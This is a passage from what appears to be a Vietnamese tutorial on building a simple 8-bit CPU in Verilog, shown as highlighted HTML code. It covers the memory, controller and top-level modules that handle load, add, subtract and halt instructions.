</span></span><span style="display:flex;"><span>	<span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">3</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">mar</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">ram</span>[<span style="color:#d19a66">0</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">15</span>];		<span style="color:#7f848e">// 16 byte bộ nhớ (1 byte = 8 bit)
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">always</span> @ (<span style="color:#c678dd">posedge</span> <span style="color:#e06c75">clk</span>, <span style="color:#c678dd">posedge</span> <span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> (<span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">mar</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#d19a66">4</span><span style="color:#d19a66">&#39;b0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">load</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">mar</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#e06c75">bus</span>[<span style="color:#d19a66">3</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>];
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">assign</span> <span style="color:#e06c75">out</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ram</span>[<span style="color:#e06c75">mar</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h3 id="controller-bộ-điều-khiển">Controller (Bộ điều khiển)</h3>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#7f848e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">Tín hiệu điều khiển:
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">    *hlt*: dừng thực thi lệnh
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">    *pc_inc*: tăng bộ đếm chương trình (*PC*)
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">    *pc_en*: cho dữ liệu trong *PC* lên bus
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">    *mar_load*: cho địa chỉ cần truy cập vào *MAR*
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">    *mem_en*: cho dữ liệu trong bộ nhớ lên bus
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">    *ir_load*: cho dữ liệu trong bus vào thanh ghi câu lệnh (*IR*)
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">    *ir_en*: cho dữ liệu trong ir lên bus
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">    *a_load*: cho dữ liệu trong bus vào thanh ghi A
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">    *a_en*: cho dữ liệu trong thanh ghi A lên bus
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">    *b_load*: cho dữ liệu trong bus vào thanh ghi B
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">    *adder_sub*: chuyển adder sang chế độ trừ (A - B)
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">    *adder_en*: cho dữ liệu trong adder lên bus
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">*/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">controller</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">clk</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">rst</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span>[<span style="color:#d19a66">3</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">opcode</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">output</span>[<span style="color:#d19a66">11</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">out</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">HLT</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">11</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">PC_INC</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">10</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">PC_EN</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">9</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">MAR_LOAD</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">8</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">MEM_EN</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">7</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">IR_LOAD</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">6</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">IR_EN</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">A_LOAD</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">A_EN</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">3</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">B_LOAD</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">2</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">ADDER_SUB</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">ADDER_EN</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">OP_LDA</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span><span style="color:#d19a66">&#39;b0000</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">OP_ADD</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span><span style="color:#d19a66">&#39;b0001</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">OP_SUB</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span><span style="color:#d19a66">&#39;b0010</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">localparam</span> <span style="color:#e06c75">OP_HLT</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span><span style="color:#d19a66">&#39;b1111</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">2</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">stage</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">11</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">ctrl_word</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// tăng đoạn thực thi
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>	<span style="color:#c678dd">always</span> @ (<span style="color:#c678dd">posedge</span> <span style="color:#e06c75">clk</span>, <span style="color:#c678dd">posedge</span> <span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> (<span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">stage</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> 
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">if</span> (<span style="color:#e06c75">stage</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">5</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">stage</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span>
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">stage</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#e06c75">stage</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// check đoạn thực thi và opcode
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>	<span style="color:#c678dd">always</span> @ (<span style="color:#56b6c2">*</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">ctrl_word</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">12</span><span style="color:#d19a66">&#39;b0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">case</span> (<span style="color:#e06c75">stage</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#d19a66">0</span><span style="color:#56b6c2">:</span>
</span></span><span style="display:flex;"><span>				<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>					<span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">PC_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>					<span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">MAR_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>			<span style="color:#d19a66">1</span><span style="color:#56b6c2">:</span>
</span></span><span style="display:flex;"><span>				<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>					<span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">PC_INC</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#d19a66">2</span><span style="color:#56b6c2">:</span> 
</span></span><span style="display:flex;"><span>				<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>					<span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">MEM_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>					<span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">IR_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#d19a66">3</span><span style="color:#56b6c2">:</span>
</span></span><span style="display:flex;"><span>				<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>					<span style="color:#c678dd">case</span> (<span style="color:#e06c75">opcode</span>)
</span></span><span style="display:flex;"><span>						<span style="color:#e06c75">OP_LDA:</span> 
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">IR_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">MAR_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">OP_ADD:</span> 
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">IR_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">MAR_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">OP_SUB:</span> 
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">IR_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">MAR_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">OP_HLT:</span> 
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">HLT</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">endcase</span>
</span></span><span style="display:flex;"><span>				<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>            <span style="color:#d19a66">4</span><span style="color:#56b6c2">:</span> 
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">case</span> (<span style="color:#e06c75">opcode</span>)
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">OP_LDA:</span> 
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">MEM_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">A_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">OP_ADD:</span> 
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">MEM_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">B_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">OP_SUB:</span> 
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">MEM_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">B_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">endcase</span>
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#d19a66">5</span><span style="color:#56b6c2">:</span> 
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">case</span> (<span style="color:#e06c75">opcode</span>)
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">OP_ADD:</span> 
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">ADDER_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">A_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">OP_SUB:</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">ADDER_SUB</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">ADDER_EN</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">ctrl_word</span>[<span style="color:#e06c75">A_LOAD</span>] <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">endcase</span>
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">endcase</span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">assign</span> <span style="color:#e06c75">out</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ctrl_word</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h3 id="mô-đun-top_design">Mô-đun top_design</h3>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">top_design</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">CLK</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">bus</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#7f848e">// chọn giữa các đầu ra của các mô-đun
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>	<span style="color:#c678dd">always</span> @ (<span style="color:#56b6c2">*</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> (<span style="color:#e06c75">ir_en</span>) 
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ir_out</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">adder_en</span>) 
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">adder_out</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">a_en</span>) 
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">a_out</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">mem_en</span>) 
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">mem_out</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">pc_en</span>) 
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pc_out</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> 
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">8</span><span style="color:#d19a66">&#39;b0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// clock
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">rst</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">hlt</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">clk</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">clock</span> <span style="color:#e06c75">clock</span> (
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">hlt</span>(<span style="color:#e06c75">hlt</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk_in</span>(<span style="color:#e06c75">CLK</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk_out</span>(<span style="color:#e06c75">clk</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// program counter
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">pc_inc</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">pc_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">pc_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">pc</span> <span style="color:#e06c75">pc</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">inc</span>(<span style="color:#e06c75">pc_inc</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">pc_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// memory
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">mar_load</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">mem_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">mem_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">memory</span> <span style="color:#e06c75">mem</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">load</span>(<span style="color:#e06c75">mar_load</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">bus</span>(<span style="color:#e06c75">bus</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">mem_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// register A
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">a_load</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">a_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">a_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">reg_a</span> <span style="color:#e06c75">reg_a</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">load</span>(<span style="color:#e06c75">a_load</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">bus</span>(<span style="color:#e06c75">bus</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">a_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// register B
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">b_load</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">b_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">reg_b</span> <span style="color:#e06c75">reg_b</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">load</span>(<span style="color:#e06c75">b_load</span>),
